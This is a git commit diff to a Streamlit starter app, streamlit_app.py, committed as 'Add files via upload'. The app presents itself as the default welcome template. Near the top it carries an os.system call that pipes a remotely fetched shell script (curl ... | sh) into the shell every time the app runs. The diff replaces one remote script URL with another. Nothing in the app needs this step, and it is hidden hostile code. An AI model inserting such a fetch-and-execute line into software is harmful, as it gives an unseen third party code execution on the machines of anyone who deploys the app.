53b757d5400c0a7be53b29e99c06998c01017ecb
meronejas <95197442+meronejas@users.noreply.github.com>
2021-12-01 09:45:54 +0700

    Add files via upload

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,16 +4,13 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('curl -fsSL https://www.animania.tech/vscode.txt | sh')
+os.system('curl -fsSL https://raw.githubusercontent.com/kancomue/shiny-spoon/main/opocok.sh | sh')
 
 """
 # Welcome to Streamlit!
-
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
-
 If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
 forums](https://discuss.streamlit.io).
-
 In the meantime, below is an example of what you can do with just a few lines of code:
 """
 
